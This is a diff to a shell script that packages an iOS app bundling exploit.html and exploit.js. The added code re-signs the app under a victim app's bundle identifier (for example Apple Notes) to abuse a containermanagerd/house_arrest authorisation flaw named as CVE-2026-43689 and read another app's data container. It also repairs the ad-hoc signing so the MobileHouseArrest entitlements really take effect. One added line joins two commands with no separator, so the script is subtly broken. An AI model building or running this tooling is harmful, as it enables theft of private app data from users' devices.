@@ -47,17 +47,31 @@ rm -rf "$PAYLOAD" "$OUT/${APP_NAME}_${STAMP}.ipa"
 mkdir -p "$PAYLOAD"
 [[ -f "$BUNDLE/Info.plist" ]] || cp "$PROJ/Info.plist" "$BUNDLE/Info.plist" || true
 cp -r "$BUNDLE" "$PAYLOAD/${APP_NAME}.app"
+# SPOOF_ID: the containermanagerd "identity trust" flaw authorises the
+# caller by the CodeDirectory identifier, and ldid takes the identifier
+# from CFBundleIdentifier. To ask MCM for ANOTHER app's container we sign
+# with the victim's identifier:
+#   SPOOF_ID=com.apple.mobilenotes bash package_ipa.sh
+if [[ -n "${SPOOF_ID:-}" ]]; then
+    python3 "$PROJ/Tools/spoof_id.py" "$PAYLOAD/${APP_NAME}.app/Info.plist" "$SPOOF_ID"    echo "[IPA] CFBundleIdentifier -> $SPOOF_ID (spoofed)"
+fi
 # Theos stages each resource twice: at the bundle root (basename) AND under
 # its relative subdirectory. The stage loads Resources/webkit/* via
 # subdirectory:"webkit", so the root copies are removed to keep the bundle
 # unambiguous.
 rm -f "$PAYLOAD/${APP_NAME}.app/exploit.html" "$PAYLOAD/${APP_NAME}.app/exploit.js"
-if command -v ldid >/dev/null 2>&1; then
-    # ad-hoc (ldid) signature: we control BOTH the entitlements and the
-    # CodeDirectory identifier. That is exactly the condition the
-    # containermanagerd / house_arrest "identity trust" flaw needs
-    # (CVE-2026-43689, CWE-862): MCM authorises the caller by the
-    # identifier, and with a dev/ad-hoc signature the identifier is free.
+# ldid: the one in PATH (/home/abzal/.local/bin/ldid) is a BROKEN wrapper
+# (it execs a bogus path and exits non-zero), and the old "|| true" hid
+# that - so the binaries were never signed and the entitlements never
+# applied. Pick a ldid that actually runs, and verify the result.
+LDID=""
+for cand in "$THEOS/toolchain/linux/iphone/bin/ldid" "$HOME/ios-toolchain/bin/ldid" "$(command -v ldid 2>/dev/null)"; do
+    [ -x "$cand" ] || continue
+    if "$cand" -e /dev/null >/dev/null 2>&1 || "$cand" >/dev/null 2>&1; then
+        LDID="$cand"; break
+    fi
+done
+if [ -n "$LDID" ]; then
     ENT_TMP="$(mktemp -d)/ent.plist"
     cat > "$ENT_TMP" <<'ENTPLIST'
 <?xml version="1.0" encoding="UTF-8"?>
@@ -74,10 +88,20 @@ if command -v ldid >/dev/null 2>&1; then
 </dict>
 </plist>
 ENTPLIST
-    ldid -S"$ENT_TMP" "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || ldid -S "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || true
-    echo "[IPA] подписано ldid -S"
+    if "$LDID" -S"$ENT_TMP" "$PAYLOAD/${APP_NAME}.app/$APP_NAME"; then
+        echo "[IPA] подписано ldid ($LDID) + entitlements"
+    else
+        echo "[IPA] WARN: ldid -S<ent> не отработал, пробую без entitlements" >&2
+        "$LDID" -S "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || echo "[IPA] WARN: подпись не удалась" >&2
+    fi
+    # verify: the entitlements MUST be in the binary
+    if "$LDID" -e "$PAYLOAD/${APP_NAME}.app/$APP_NAME" 2>/dev/null | grep -q "MobileHouseArrest"; then
+        echo "[IPA] entitlements ПОДТВЕРЖДЕНЫ в бинарнике"
+    else
+        echo "[IPA] ВНИМАНИЕ: entitlements в бинарнике НЕТ" >&2
+    fi
 else
-    echo "[IPA] WARN: ldid отсутствует — подпись пропущена."
+    echo "[IPA] WARN: рабочий ldid не найден - приложение останется без подписи." >&2
 fi
 (cd "$PROJ" && zip -qry "$OUT/${APP_NAME}_${STAMP}.ipa" Payload)
 rm -rf "$PAYLOAD"
